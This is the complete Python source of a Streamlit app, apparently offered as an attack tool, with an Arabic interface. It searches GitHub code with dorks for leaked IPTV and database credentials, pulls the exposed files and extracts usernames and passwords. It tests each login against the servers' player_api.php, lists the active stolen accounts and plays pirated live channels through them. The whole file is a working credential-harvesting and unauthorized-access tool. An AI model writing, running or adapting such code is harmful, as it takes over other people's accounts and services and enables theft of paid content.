import streamlit as st
import requests
import re
import time
import threading

# --- Config ---
st.set_page_config(page_title="BEAST V30 - BYPASS", layout="wide")

if "hits" not in st.session_state: st.session_state.hits = []
if "log" not in st.session_state: st.session_state.log = "جاهز للبدء..."
if "auth" not in st.session_state: st.session_state.auth = False

# --- Login ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align:center; color:#00ff41;'>🌪️ BEAST V30 - BYPASS SYSTEM</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("Unlock"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- CSS ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .status-box { background: #111; border: 1px solid #333; padding: 10px; border-radius: 5px; font-family: monospace; color: #00ff41; margin-bottom: 20px; }
    .hit-box { background: #0d1117; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
    .cat-tag { background: #21262d; border: 1px solid #30363d; color: #8b949e; padding: 2px 7px; border-radius: 5px; font-size: 11px; margin-right: 5px; display: inline-block; }
</style>
""", unsafe_allow_html=True)

# --- Engine ---
def ultimate_scanner(token):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    # دروكات "خام" لا يتم حظرها بسهولة
    dorks = [
        'extension:m3u "player_api.php"', 
        'extension:txt "username=" "password=" "http"',
        'filename:config.php "db_user" "db_pass"',
        '"XC_USER_DATA"'
    ]
    
    for dork in dorks:
        st.session_state.log = f"🔎 جاري البحث عن: {dork}..."
        for page in range(1, 15):
            try:
                url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = requests.get(url, headers=headers)
                
                if res.status_code == 401:
                    st.session_state.log = "❌ خطأ: التوكن غير صالح! (Unauthorized)"
                    return
                if res.status_code == 403:
                    st.session_state.log = "⏳ حظر مؤقت من جيت هاب.. انتظر 30 ثانية"
                    time.sleep(30)
                    continue
                
                data = res.json()
                if 'items' not in data: continue

                for item in data['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=3).text
                    found = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for host, user, pw in found:
                        if not any(h['host'] == host for h in st.session_state.hits):
                            try:
                                # فحص السيرفر وجلب القوائم
                                api = f"{host}/player_api.php?username={user}&password={pw}"
                                info = requests.get(api, timeout=3).json()
                                if info.get("user_info", {}).get("status") == "Active":
                                    cats = requests.get(f"{api}&action=get_live_categories", timeout=3).json()
                                    cat_list = [c['category_name'] for c in cats[:12]] if isinstance(cats, list) else []
                                    
                                    st.session_state.hits.insert(0, {
                                        "host": host, "user": user, "pw": pw,
                                        "cats": cat_list, "info": info["user_info"]
                                    })
                            except: continue
            except: continue
    st.session_state.log = "✅ انتهى الفحص الشامل."

# --- UI ---
st.title("📡 BEAST V30 - رادار النتائج الضخمة")

st.markdown(f"<div class='status-box'>{st.session_state.log}</div>", unsafe_allow_html=True)

with st.sidebar:
    st.header("⚡ التحكم")
    token = st.text_input("GitHub Token (Classic):", type="password")
    if st.button("🚀 بدء الهجوم العنيف"):
        if token:
            st.session_state.hits = []
            threading.Thread(target=ultimate_scanner, args=(token,), daemon=True).start()
        else: st.error("أدخل التوكن!")
    
    st.write(f"📈 النتائج: {len(st.session_state.hits)}")

if not st.session_state.hits:
    st.info("لم تظهر نتائج؟ جرب إنشاء توكن جديد بصلاحيات 'repo' كاملة.")
else:
    for srv in st.session_state.hits:
        with st.container():
            st.markdown(f"""
            <div class="hit-box">
                <b style="color:#00ff41;">SERVER:</b> {srv['host']}<br>
                <b style="color:#fbbf24;">LOGIN:</b> {srv['user']} | {srv['pw']}<br>
                <div style="margin-top:10px;">
                    {" ".join([f"<span class='cat-tag'>{c}</span>" for c in srv['cats']])}
                </div>
            </div>
            """, unsafe_allow_html=True)
            if st.button(f"📺 فتح المستعرض لـ {srv['host'][:20]}...", key=srv['host']):
                st.session_state.current_srv = srv
                st.session_state.view = "player"

# --- Player View ---
if "view" in st.session_state and st.session_state.view == "player":
    st.divider()
    s = st.session_state.current_srv
    st.subheader(f"📺 مستعرض قنوات: {s['host']}")
    if st.button("⬅️ عودة للرادار"): 
        st.session_state.view = "search"
        st.rerun()
        
    # جلب القنوات
    api = f"{s['host']}/player_api.php?username={s['user']}&password={s['pw']}&action=get_live_streams"
    streams = requests.get(api, timeout=5).json()
    
    search_q = st.text_input("🔍 ابحث عن قناة (مثال: bein, ssc, osn)...")
    
    col1, col2 = st.columns([1, 2])
    with col1:
        st.markdown("<div style='height:500px; overflow-y:auto;'>", unsafe_allow_html=True)
        for ch in streams:
            if search_q.lower() in ch['name'].lower():
                if st.button(ch['name'], key=ch['stream_id'], use_container_width=True):
                    st.session_state.play_url = f"{s['host']}/live/{s['user']}/{s['pw']}/{ch['stream_id']}.m3u8"
        st.markdown("</div>", unsafe_allow_html=True)
    
    with col2:
        if "play_url" in st.session_state:
            st.video(st.session_state.play_url)
            st.code(st.session_state.play_url)
